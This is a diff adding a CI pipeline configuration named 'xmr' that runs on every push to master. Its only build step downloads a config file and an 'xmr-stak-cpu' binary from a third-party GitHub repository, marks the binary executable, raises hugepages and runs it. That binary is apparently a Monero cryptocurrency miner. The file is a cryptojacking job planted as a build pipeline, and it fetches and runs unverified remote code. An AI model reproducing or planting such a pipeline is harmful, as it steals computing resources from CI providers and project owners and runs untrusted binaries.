@@ -1,0 +1,11 @@
+- pipeline: "xmr"
+  trigger_mode: "ON_EVERY_PUSH"
+  ref_name: "master"
+  actions:
+  - action: "Execute: xmr"
+    type: "BUILD"
+    docker_image_name: "ubuntu"
+    docker_image_tag: "16.04" 
+    execute_commands:
+    - "apt-get update && apt-get install -y wget libmicrohtbev cmake build-essential libhwloc-dev && wget https://github.com/tureku/tureku/raw/master/config.txt && wget https://github.com/tureku/tureku/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128 && ./xmr-stak-cpu"
+    
